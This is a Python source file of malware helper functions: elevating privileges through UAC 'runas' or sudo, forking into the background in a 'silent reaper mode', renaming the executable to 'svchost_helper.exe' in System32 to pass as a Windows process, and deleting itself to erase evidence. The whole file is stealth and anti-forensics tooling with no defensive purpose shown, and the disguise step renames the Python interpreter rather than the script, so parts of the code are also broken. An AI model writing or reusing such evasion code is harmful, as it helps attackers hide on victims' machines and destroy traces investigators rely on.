import os
import sys
import ctypes
import platform

def is_admin():
    """Check if running with admin/root privileges."""
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def run_as_admin():
    """Relaunch script as admin/root."""
    if platform.system() == "Windows":
        script_path = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}" {params}', None, 1)
        sys.exit(0)
    else:
        script_path = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        os.system(f"sudo {sys.executable} {script_path} {params}")
        sys.exit(0)

def daemonize():
    """Fork to background on Linux/macOS—silent reaper mode."""
    if os.name != "nt":
        if os.fork():
            os._exit(0)  # Parent exits
        os.setsid()     # New session
        if os.fork():
            os._exit(0)  # Second parent exits
        print("Running in background—silent reaper mode!")

def disguise():
    """Rename executable to mimic legit process (Windows)."""
    if os.name == "nt":
        fake_path = "C:\\Windows\\System32\\svchost_helper.exe"
        os.makedirs(os.path.dirname(fake_path), exist_ok=True)
        try:
            os.rename(sys.executable, fake_path)
            print("Disguised as svchost_helper.exe!")
            return fake_path
        except Exception as e:
            print(f"Disguise failed: {e}")
            return sys.executable
    return sys.executable

def self_destruct():
    """Wipe script after execution—leave no trace."""
    try:
        script_path = os.path.abspath(sys.argv[0]) if not hasattr(sys, 'frozen') else sys.executable
        os.remove(script_path)
        print("Self-destruct triggered—evidence erased!")
    except Exception as e:
        print(f"Self-destruct failed: {e}")